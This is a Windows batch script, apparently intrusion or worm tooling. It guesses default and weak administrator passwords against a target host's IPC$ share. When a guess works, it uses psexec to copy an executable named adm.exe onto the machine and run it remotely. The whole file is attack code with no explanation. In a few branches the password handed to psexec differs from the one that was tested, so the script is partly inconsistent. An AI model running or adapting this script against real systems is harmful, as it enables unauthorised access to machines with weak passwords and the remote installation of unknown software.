@echo off
net use \\%1\ipc$ "Administrator" /user:Administrator
if not errorlevel 1 goto adad
net use \\%1\ipc$ "" /user:Administrator
if not errorlevel 1 goto blkad
net use \\%1\ipc$ "test" /user:test
if not errorlevel 1 goto testt
net use \\%1\ipc$ "test" /user:Administrator
if not errorlevel 1 goto adtest
net use \\%1\ipc$ "test123" /user:Administrator
if not errorlevel 1 goto adtestt
net use \\%1\ipc$ "temp" /user:Administrator
if not errorlevel 1 goto adtemp
net use \\%1\ipc$ "temp123" /user:Administrator
if not errorlevel 1 goto adtempp
net use \\%1\ipc$ "pass" /user:Administrator
if not errorlevel 1 goto adpass
net use \\%1\ipc$ "password" /user:Administrator
if not errorlevel 1 goto adpassw
net use \\%1\ipc$ "admin" /user:Administrator
if not errorlevel 1 goto adadmin
net use \\%1\ipc$ "root" /user:root
if not errorlevel 1 goto rootroot
net use \\%1\ipc$ "changeme" /user:Administrator
if not errorlevel 1 goto adminch
net use \\%1\ipc$ "admin" /user:admin
if not errorlevel 1 goto adminad
goto end
:blkad
psexec \\%1 -u Administrator -p "" -d attrib.exe -r adm.exe
psexec \\%1 -u Administrator -p "" -f -c -d adm.exe -o
psexec \\%1 -u Administrator -p "" -d adm.exe -o
goto end
:adad
psexec \\%1 -u Administrator -p "admin" -d attrib.exe -r adm.exe
psexec \\%1 -u Administrator -p "admin" -f -c -d adm.exe -o
psexec \\%1 -u Administrator -p "admin" -d adm.exe -o
goto end
:adadmin
psexec \\%1 -u Administrator -p "administrator" -d attrib.exe -r adm.exe
psexec \\%1 -u Administrator -p "administrator" -f -c -d adm.exe -o
psexec \\%1 -u Administrator -p "administrator" -d adm.exe -o
goto end
:rootroot
psexec \\%1 -u root -p "root" -d attrib.exe -r adm.exe
psexec \\%1 -u root -p "root" -f -c -d adm.exe -o
psexec \\%1 -u root -p "root" -d adm.exe -o
goto end
:adminad
psexec \\%1 -u admin -p "admin" -d attrib.exe -r adm.exe
psexec \\%1 -u admin -p "admin" -f -c -d adm.exe -o
psexec \\%1 -u admin -p "admin" -d adm.exe -o
goto end
:adtest
psexec \\%1 -u administrator -p "test" -d attrib.exe -r adm.exe
psexec \\%1 -u administrator -p "test" -f -c -d adm.exe -o
psexec \\%1 -u administrator -p "test" -d adm.exe -o
goto end
:testt
psexec \\%1 -u test -p "test" -d attrib.exe -r adm.exe
psexec \\%1 -u test -p "test" -f -c -d adm.exe -o
psexec \\%1 -u test -p "test" -d adm.exe -o
goto end
:adtestt
psexec \\%1 -u administrator -p "test123" -d attrib.exe -r adm.exe
psexec \\%1 -u administrator -p "test123" -f -c -d adm.exe -o
psexec \\%1 -u administrator -p "test123" -d adm.exe -o
goto end
:adtemp
psexec \\%1 -u administrator -p "temp" -d attrib.exe -r adm.exe
psexec \\%1 -u administrator -p "temp" -f -c -d adm.exe -o
psexec \\%1 -u administrator -p "temp" -d adm.exe -o
goto end
:adtempp
psexec \\%1 -u administrator -p "temp123" -d attrib.exe -r adm.exe
psexec \\%1 -u administrator -p "temp123" -f -c -d adm.exe -o
psexec \\%1 -u administrator -p "temp123" -d adm.exe -o
goto end
:adpass
psexec \\%1 -u administrator -p "pass" -d attrib.exe -r adm.exe
psexec \\%1 -u administrator -p "pass" -f -c -d adm.exe -o
psexec \\%1 -u administrator -p "pass" -d adm.exe -o
goto end
:adpassw
psexec \\%1 -u administrator -p "password" -d attrib.exe -r adm.exe
psexec \\%1 -u administrator -p "password" -f -c -d adm.exe -o
psexec \\%1 -u administrator -p "password" -d adm.exe -o
goto end
:adminch
psexec \\%1 -u administrator -p "changeme" -d attrib.exe -r adm.exe
psexec \\%1 -u administrator -p "changeme" -f -c -d adm.exe -o
psexec \\%1 -u administrator -p "changeme" -d adm.exe -o
goto end
:end
